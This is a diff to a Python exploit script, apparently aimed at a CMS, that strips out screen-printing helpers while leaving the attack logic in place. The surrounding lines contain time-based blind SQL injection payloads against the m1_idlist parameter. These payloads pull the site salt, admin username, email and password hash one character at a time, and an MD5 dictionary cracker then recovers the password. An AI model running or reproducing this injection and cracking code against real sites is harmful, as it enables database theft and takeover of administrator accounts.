@@ -42,22 +42,11 @@ def crack_password():
     dict = open(wordlist)
     for line in dict.readlines():
         line = line.replace("\n", "")
-        beautify_print_try(line)
+
         if hashlib.md5(str(salt) + line).hexdigest() == password:
             output += "\n[+] Password cracked: " + line
             break
     dict.close()
-
-def beautify_print_try(value):
-    global output
-    print ("\033c")
-    cprint(output,'green', attrs=['bold'])
-    cprint('[*] Try: ' + value, 'red', attrs=['bold'])
-
-def beautify_print():
-    global output
-    print ("\033c")
-    cprint(output,'green', attrs=['bold'])
 
 def dump_salt():
     global flag
@@ -70,7 +59,7 @@ def dump_salt():
         for i in range(0, len(dictionary)):
             temp_salt = salt + dictionary[i]
             ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
-            beautify_print_try(temp_salt)
+
             payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
             url = url_vuln + "&m1_idlist=" + payload
             start_time = time.time()
@@ -96,7 +85,7 @@ def dump_password():
         for i in range(0, len(dictionary)):
             temp_password = password + dictionary[i]
             ord_password_temp = ord_password + hex(ord(dictionary[i]))[2:]
-            beautify_print_try(temp_password)
+
             payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users"
             payload += "+where+password+like+0x" + ord_password_temp + "25+and+user_id+like+0x31)+--+"
             url = url_vuln + "&m1_idlist=" + payload
@@ -123,7 +112,7 @@ def dump_username():
         for i in range(0, len(dictionary)):
             temp_db_name = db_name + dictionary[i]
             ord_db_name_temp = ord_db_name + hex(ord(dictionary[i]))[2:]
-            beautify_print_try(temp_db_name)
+
             payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+username+like+0x" + ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
             url = url_vuln + "&m1_idlist=" + payload
             start_time = time.time()
@@ -149,7 +138,7 @@ def dump_email():
         for i in range(0, len(dictionary)):
             temp_email = email + dictionary[i]
             ord_email_temp = ord_email + hex(ord(dictionary[i]))[2:]
-            beautify_print_try(temp_email)
+
             payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+email+like+0x" + ord_email_temp + "25+and+user_id+like+0x31)+--+"
             url = url_vuln + "&m1_idlist=" + payload
             start_time = time.time()
@@ -170,7 +159,5 @@ dump_email()
 dump_password()
 
 if options.cracking:
-    print("[*] Now try to crack password")
     crack_password()
 
-beautify_print()
